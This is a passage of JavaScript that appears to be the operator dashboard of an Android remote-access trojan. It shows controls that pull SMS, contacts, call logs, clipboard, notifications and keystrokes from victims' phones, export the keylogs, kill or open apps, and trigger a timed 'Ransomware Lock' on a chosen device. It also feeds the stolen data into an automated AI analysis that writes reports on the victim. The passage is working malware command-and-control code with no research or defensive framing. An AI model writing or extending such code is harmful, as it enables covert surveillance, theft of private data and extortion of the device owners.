        list.appendChild(row);
    });
}
function addKeylog(id, data) {
    keylogLines.push('[' + new Date().toLocaleTimeString() + '] ' + id.substring(0, 8) + ' :: ' + data);
    if (keylogLines.length > 2000) keylogLines.shift();
    if (document.getElementById('keylog').classList.contains('active')) renderKeylog();
}
function renderKeylog() {
    var s = document.getElementById('keylog-stream');
    if (!s) return;
    s.innerHTML = '';
    keylogLines.slice(-500).forEach(function (line) {
        var d = document.createElement('div');
        d.className = 'keylog-line';
        d.textContent = line;
        s.appendChild(d);
    });
    s.scrollTop = s.scrollHeight;
}
function clearKeylog() { keylogLines = []; renderKeylog(); }
function exportKeylog() {
    var b = new Blob([keylogLines.join('\n')], { type: 'text/plain' });
    var u = URL.createObjectURL(b);
    var a = document.createElement('a');
    a.href = u; a.download = 'keylog.txt'; a.click();
}
async function loadNotifications() { renderNotifications(); }
function renderNotifications() {
    var s = document.getElementById('notifications-stream');
    if (!s) return;
    s.innerHTML = '';
    if (!notificationLines.length) { s.innerHTML = '<div class="empty-state"><p>No notifications yet</p></div>'; return; }
    notificationLines.slice(-500).reverse().forEach(function (n) {
        var d = document.createElement('div');
        d.className = 'keylog-line';
        d.innerHTML = '<span style="color:#666">[' + n.time + ']</span> <span style="color:#00ccff">' + escapeHtml(n.pkg) + '</span> <strong style="color:#00ff00">' + escapeHtml(n.title) + '</strong> - ' + escapeHtml(n.text);
        s.appendChild(d);
    });
}
function clearNotifications() { notificationLines = []; renderNotifications(); }
function fetchNotifications() {
    if (!selectedDeviceId) { addLog('warning', 'No device selected'); return; }
    sendCommand('GET_NOTIFICATIONS', {});
    addLog('info', 'Requested notifications');
}
async function getApps() { await sendCommand('GET_APPS', {}); }
function renderAppsList(apps) {
    var p = document.getElementById('apps-list-content');
    if (!p) return;
    if (apps) appsCache = apps;
    var filter = '';
    try { filter = (document.getElementById('apps-search').value || '').toLowerCase(); } catch (e) { }
    var list = appsCache || [];
    p.innerHTML = '';
    if (!list.length) { p.innerHTML = '<div class="empty-state"><p>No apps</p></div>'; return; }
    list.sort(function (a, b) { return (a.name || '').localeCompare(b.name || ''); });
    list.forEach(function (app) {
        if (filter && (app.name || '').toLowerCase().indexOf(filter) === -1 && (app.package || '').toLowerCase().indexOf(filter) === -1) return;
        var row = document.createElement('div');
        row.className = 'app-row';
        var col = document.createElement('div');
        col.className = 'app-name-col';
        col.innerHTML = '<div class="app-name">' + escapeHtml(app.name || '') + (app.system ? '<span class="app-badge system">SYS</span>' : '') + '</div><div class="app-pkg">' + escapeHtml(app.package || '') + '</div>';
        var actions = document.createElement('div');
        actions.className = 'app-actions';
        var openBtn = document.createElement('button');
        openBtn.className = 'app-action-btn';
        openBtn.textContent = 'Open';
        openBtn.addEventListener('click', function () { sendCommand('OPEN_APP', { package: app.package }); });
        var blockBtn = document.createElement('button');
        blockBtn.className = 'app-action-btn danger';
        blockBtn.textContent = 'Block';
        blockBtn.addEventListener('click', function () { sendCommand('KILL_APP', { package: app.package }); });
        actions.appendChild(openBtn);
        actions.appendChild(blockBtn);
        row.appendChild(col);
        row.appendChild(actions);
        p.appendChild(row);
    });
}
async function fetchSMS() { await sendCommand('GET_SMS', {}); setTimeout(function () { showData('sms'); }, 1500); }
async function fetchContacts() { await sendCommand('GET_CONTACTS', {}); setTimeout(function () { showData('contacts'); }, 1500); }
async function fetchCalls() { await sendCommand('GET_CALLS', {}); setTimeout(function () { showData('calls'); }, 1500); }
async function fetchClipboard() { await sendCommand('GET_CLIPBOARD', {}); setTimeout(function () { showData('clipboard'); }, 1500); }
async function fetchKeylogs() { showData('keylogs'); }
async function showData(tab) {
    currentDataTab = tab;
    document.querySelectorAll('.data-tab').forEach(function (b) {
        b.classList.remove('active');
        if (b.textContent.toLowerCase().indexOf(tab) !== -1) b.classList.add('active');
    });
    var c = document.getElementById('data-content');
    if (!c) return;
    if (!selectedDeviceId) { c.innerHTML = '<div class="empty-state"><p>Select a device first</p></div>'; return; }
    try {
        var data = await window.api.getData(tab, selectedDeviceId);
        c.innerHTML = '';
        if (!data || !data.length) { c.innerHTML = '<div class="empty-state"><p>No data</p></div>'; return; }
        data.forEach(function (item) {
            var d = document.createElement('div');
            d.className = 'data-item';
            d.innerHTML = formatData(tab, item);
            c.appendChild(d);
        });
    } catch (e) { }
}
function formatData(tab, item) {
    if (tab === 'sms') return '<strong>' + escapeHtml(item.address || '') + '</strong><br>' + escapeHtml(item.body || '');
    if (tab === 'contacts') return '<strong>' + escapeHtml(item.name || '') + '</strong> - ' + escapeHtml(item.phone || '');
    if (tab === 'keylogs') return escapeHtml(item.data || '');
    if (tab === 'clipboard') return escapeHtml(item.data || '');
    if (tab === 'calls') return escapeHtml(item.number || '');
    return '';
}
async function exportData() {
    try {
        var r = await window.api.exportData();
        if (r && r.success) addLog('success', 'Exported: ' + r.path);
    } catch (e) { }
}
async function clearData() {
    if (!confirm('Clear all data?')) return;
    await window.api.clearData();
    showData(currentDataTab);
}
async function ransomStart() {
    if (!selectedDeviceId) { addLog('warning', 'Select a device first'); return; }
    var h = parseInt(document.getElementById('ransom-hours').value) || 0;
    var m = parseInt(document.getElementById('ransom-minutes').value) || 0;
    var s = parseInt(document.getElementById('ransom-seconds').value) || 0;
    var variant = ransomCurrentVariant;
    var totalSec = h * 3600 + m * 60 + s;
    if (totalSec <= 0) { addLog('warning', 'Set a countdown > 0'); return; }
    openConfirmModal('Activate Ransomware Lock', 'Lock the device for ' + h + 'h ' + m + 'm ' + s + 's?', function () {
        sendCommand('RANSOM_START', { hours: h, minutes: m, seconds: s, variant: variant });
        addLog('warning', 'RANSOMWARE lock activated');
    });
}
function ransomExtend() {
    if (!selectedDeviceId) { addLog('warning', 'Select a device first'); return; }
    openInputModal('Extend Lock', 'Extend by how many minutes?', '60', function (value) {
        var m = parseInt(value);
        if (!m || m <= 0) { addLog('warning', 'Invalid minutes'); return; }
        sendCommand('RANSOM_EXTEND', { minutes: m });
    });
}
function ransomRelease() {
    if (!selectedDeviceId) { addLog('warning', 'Select a device first'); return; }
    openInputModal('Release Lock', 'Type CONFIRM to release', '', function (value) {
        if (value !== 'CONFIRM') { addLog('warning', 'Release cancelled'); return; }
        sendCommand('RANSOM_RELEASE', { confirm: 'CONFIRM' });
    });
}
async function ransomSync() {
    if (!selectedDeviceId) return;
    await sendCommand('RANSOM_SYNC', {});
}
function openConfirmModal(title, message, onConfirm) {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;align-items:center;justify-content:center;';
    var box = document.createElement('div');
    box.style.cssText = 'background:#111;border:2px solid #00ccff;border-radius:10px;padding:24px;max-width:440px;color:#00ff88;font-family:Segoe UI,sans-serif;';
    box.innerHTML = '<h3 style="color:#00ccff;margin-bottom:12px;">' + escapeHtml(title) + '</h3>' +
        '<p style="color:#ccc;margin-bottom:20px;">' + escapeHtml(message) + '</p>' +
        '<div style="display:flex;gap:8px;justify-content:flex-end;">' +
        '<button id="modal-cancel" style="padding:8px 16px;background:#333;color:#fff;border:none;border-radius:5px;cursor:pointer;">Cancel</button>' +
        '<button id="modal-confirm" style="padding:8px 16px;background:#00ccff;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">Confirm</button>' +
        '</div>';
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    document.getElementById('modal-cancel').onclick = function () { document.body.removeChild(overlay); };
    document.getElementById('modal-confirm').onclick = function () {
        document.body.removeChild(overlay);
        try { onConfirm(); } catch (e) { }
    };
}
function openInputModal(title, prompt, defaultValue, onSubmit) {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;align-items:center;justify-content:center;';
    var box = document.createElement('div');
    box.style.cssText = 'background:#111;border:2px solid #00ccff;border-radius:10px;padding:24px;max-width:440px;color:#00ff88;font-family:Segoe UI,sans-serif;';
    box.innerHTML = '<h3 style="color:#00ccff;margin-bottom:12px;">' + escapeHtml(title) + '</h3>' +
        '<p style="color:#ccc;margin-bottom:10px;">' + escapeHtml(prompt) + '</p>' +
        '<input id="modal-input" type="text" value="' + escapeHtml(defaultValue) + '" style="width:100%;padding:8px;background:#000;color:#00ff00;border:1px solid #333;border-radius:5px;margin-bottom:16px;font-family:Courier New,monospace;">' +
        '<div style="display:flex;gap:8px;justify-content:flex-end;">' +
        '<button id="modal-cancel" style="padding:8px 16px;background:#333;color:#fff;border:none;border-radius:5px;cursor:pointer;">Cancel</button>' +
        '<button id="modal-confirm" style="padding:8px 16px;background:#00ccff;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">Submit</button>' +
        '</div>';
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    var input = document.getElementById('modal-input');
    input.focus();
    input.select();
    document.getElementById('modal-cancel').onclick = function () { document.body.removeChild(overlay); };
    document.getElementById('modal-confirm').onclick = function () {
        var v = input.value;
        document.body.removeChild(overlay);
        try { onSubmit(v); } catch (e) { }
    };
    input.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            var v = input.value;
            document.body.removeChild(overlay);
            try { onSubmit(v); } catch (e) { }
        }
    });
}
function setupAiAnalysisListeners() {
    if (!window.api.onAiAnalysisChunk) return;
    window.api.onAiAnalysisChunk(function (d) {
        if (!d || typeof d.text !== 'string') return;
        aiAnalysisReport += d.text;
        var out = document.getElementById('ai-analysis-output');
        if (!out) return;
        out.textContent = aiAnalysisReport;
        out.scrollTop = out.scrollHeight;
    });
    window.api.onAiAnalysisDone(function (d) {
        aiAnalysisRunning = false;
        aiAnalysisUpdateButtons();
        var out = document.getElementById('ai-analysis-output');
        if (out && d && d.report) { out.textContent = d.report; aiAnalysisReport = d.report; }
        if (d && d.warnings && d.warnings.length) {
            addLog('warning', 'Analysis warnings: ' + d.warnings.join('; '));
        }
        addLog('success', 'AI analysis complete in ' + (d && d.elapsed ? d.elapsed + 's' : '?'));
    });
    window.api.onAiAnalysisError(function (d) {
        aiAnalysisRunning = false;
        aiAnalysisUpdateButtons();
        addLog('error', 'Analysis error: ' + (d && d.error));
    });
}
function aiAnalysisUpdateButtons() {
    var runBtn = document.getElementById('ai-analysis-run-btn');
    var cancelBtn = document.getElementById('ai-analysis-cancel-btn');
    var saveBtn = document.getElementById('ai-analysis-save-btn');
    if (runBtn) { runBtn.disabled = aiAnalysisRunning; runBtn.innerHTML = aiAnalysisRunning ? '<i class="fas fa-spinner fa-spin"></i> Analyzing…' : '<i class="fas fa-brain"></i> Analyze'; }
    if (cancelBtn) cancelBtn.disabled = !aiAnalysisRunning;
    if (saveBtn) saveBtn.disabled = !aiAnalysisReport.length;
}
async function aiRunAnalysis(scope) {
    if (aiAnalysisRunning) return;
    var deviceId = selectedDeviceId;
    if (!deviceId) { addLog('warning', 'Select a device first'); return; }

    var effectiveScope = scope || 'all';
    if (!scope) {
        var checked = [];
        document.querySelectorAll('.ai-scope-check:checked').forEach(function (c) { checked.push(c.value); });
        effectiveScope = checked.length ? checked : 'all';
    }

    aiAnalysisRunning = true;
    aiAnalysisReport = '';
    aiAnalysisUpdateButtons();
    var out = document.getElementById('ai-analysis-output');
    if (out) out.textContent = '';
    var meta = document.getElementById('ai-analysis-meta');
    if (meta) meta.textContent = 'Device: ' + deviceId.substring(0, 12) + '  ·  Scope: ' + (effectiveScope === 'all' ? 'ALL' : [].concat(effectiveScope).join(', '));

    addLog('info', 'AI analysis starting on scope: ' + effectiveScope);
    try {
        var r = await window.api.aiAnalyze(deviceId, effectiveScope);
        if (!r || !r.ok) {
            aiAnalysisRunning = false;
            aiAnalysisUpdateButtons();
            addLog('error', 'Analysis failed: ' + (r && r.error));
        }
    } catch (e) {
        aiAnalysisRunning = false;
        aiAnalysisUpdateButtons();
        addLog('error', 'Analysis exception: ' + e.message);
    }
}
function aiRunTabAnalysis(scope) {
    showTab('ai-analysis');
    setTimeout(function () { aiRunAnalysis([scope]); }, 300);
}
async function aiCancelAnalysis() {
    try { await window.api.aiAnalyzeCancel(); addLog('warning', 'Analysis cancelled'); }
    catch (e) { }
}
async function aiSaveReport() {
    if (!aiAnalysisReport) return;
    var name = 'report_' + new Date().toISOString().replace(/[:.]/g, '-') + '.md';
    var r = await window.api.aiAnalyzeSave(name, aiAnalysisReport);
    if (r && r.ok) addLog('success', 'Report saved: ' + r.path);
    else addLog('error', 'Save failed: ' + (r && r.error));
}
function aiToggleAllScopes(checked) {
    document.querySelectorAll('.ai-scope-check').forEach(function (c) { c.checked = checked; });
}
function renderAiAnalysisPane() {
    renderAiDeviceSelect();
    aiAnalysisUpdateButtons();
}
function renderAiDeviceSelect() {
    var sel = document.getElementById('ai-analysis-device');
    if (!sel) return;
    window.api.getDevices().then(function (devices) {
        sel.innerHTML = '';
        if (!devices || !devices.length) {
            var o = document.createElement('option');
            o.value = ''; o.textContent = 'No devices';
            sel.appendChild(o);
            return;
        }
        devices.forEach(function (d) {
            var o = document.createElement('option');
            o.value = d.id;
            o.textContent = (d.model || 'Unknown') + ' — ' + d.id.substring(0, 8);
            if (d.id === (selectedDeviceId)) o.selected = true;
            sel.appendChild(o);
        });
    });
}
function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}
function addLog(type, message) {
    var line = { type: type, message: message, time: new Date().toLocaleTimeString() };
    logAll.push(line);
    if (logAll.length > 5000) logAll.shift();
    var cls = classifyLog(type, message);
    if (cls === 'accessibility') logAccessibility.push(line);
    else if (cls === 'device') logDevices.push(line);
    else if (cls === 'command') logCommands.push(line);
    else if (cls === 'error') logErrors.push(line);
    if (logAccessibility.length > 2000) logAccessibility.shift();
    if (logDevices.length > 2000) logDevices.shift();
    if (logCommands.length > 2000) logCommands.shift();
    if (logErrors.length > 2000) logErrors.shift();
    if (document.getElementById('logs') && document.getElementById('logs').classList.contains('active')) renderLogs();
    if (document.getElementById('dashboard') && document.getElementById('dashboard').classList.contains('active')) {
        var c = document.getElementById('activity-log');
        if (c) {
            var e = document.createElement('div');
            e.className = 'log-entry ' + type;
            e.innerHTML = '<span class="time">[' + line.time + ']</span> ' + escapeHtml(message);
            c.appendChild(e);
            c.scrollTop = c.scrollHeight;
        }
    }
}
function classifyLog(type, message) {
    if (type === 'error') return 'error';
    var m = String(message).toLowerCase();
    if (m.indexOf('accessibility') !== -1 || m.indexOf('a11y') !== -1) return 'accessibility';
    if (m.indexOf('device ') !== -1 || m.indexOf('phone') !== -1 || m.indexOf('connected') !== -1 || m.indexOf('offline') !== -1) return 'device';
    if (m.indexOf('[tap]') !== -1 || m.indexOf('[type]') !== -1 || m.indexOf('[get_') !== -1 || m.indexOf('[overlay') !== -1 || m.indexOf('[ransom') !== -1 || m.indexOf('[admin') !== -1) return 'command';
    return 'accessibility';
}
function switchLogTab(tab) {
    logTabActive = tab;
    document.querySelectorAll('.log-tab').forEach(function (b) {
        b.classList.remove('active');
        if (b.getAttribute('data-log') === tab) b.classList.add('active');
    });
    renderLogs();
}
function renderLogs() {
    var c = document.getElementById('log-content');
    if (!c) return;
    var src;
    if (logTabActive === 'accessibility') src = logAccessibility;
    else if (logTabActive === 'device') src = logDevices;
    else if (logTabActive === 'command') src = logCommands;
    else if (logTabActive === 'error') src = logErrors;
    else src = logAll;
    c.innerHTML = '';
    src.slice(-500).forEach(function (l) {
        var e = document.createElement('div');
        e.className = 'log-entry ' + l.type;
        e.innerHTML = '<span class="time">[' + l.time + ']</span> ' + escapeHtml(l.message);
        c.appendChild(e);
    });
    c.scrollTop = c.scrollHeight;
}
function clearLogs() {
    if (logTabActive === 'accessibility') logAccessibility = [];
    else if (logTabActive === 'device') logDevices = [];
    else if (logTabActive === 'command') logCommands = [];
    else if (logTabActive === 'error') logErrors = [];
    else logAll = [];
    renderLogs();
}
function exportLogs() {
    var c = document.getElementById('log-content');
    if (!c) return;
    var b = new Blob([c.innerText], { type: 'text/plain' });
    var u = URL.createObjectURL(b);
    var a = document.createElement('a');
    a.href = u; a.download = 'logs_' + logTabActive + '.txt'; a.click();
}